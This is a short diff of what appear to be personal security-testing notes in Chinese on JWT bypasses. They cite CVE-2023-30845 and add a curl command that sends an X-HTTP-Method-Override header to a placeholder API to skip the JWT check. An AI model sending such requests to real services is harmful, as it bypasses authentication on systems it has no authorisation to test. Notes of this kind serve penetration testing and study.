@@ -52,7 +52,7 @@ try base64 encode.
 # jwt 
 bypass 绕过验证
 CVE-2023-30845 通过使用 X-HTTP-Method-Override 请求标头绕过 JWT 检查！
-https://pbs.twimg.com/media/FyvL9dSX0AAuqzb?format=jpg&name=medium
+curl http://example.com/api -X POST -H 'X-HTTP-Method-Override: PUT' -H 'Content-Type: application/json' --data '{"username":"xxx"}'
 未经验证的签名--忘记验证签名了
 越权漏洞等
 
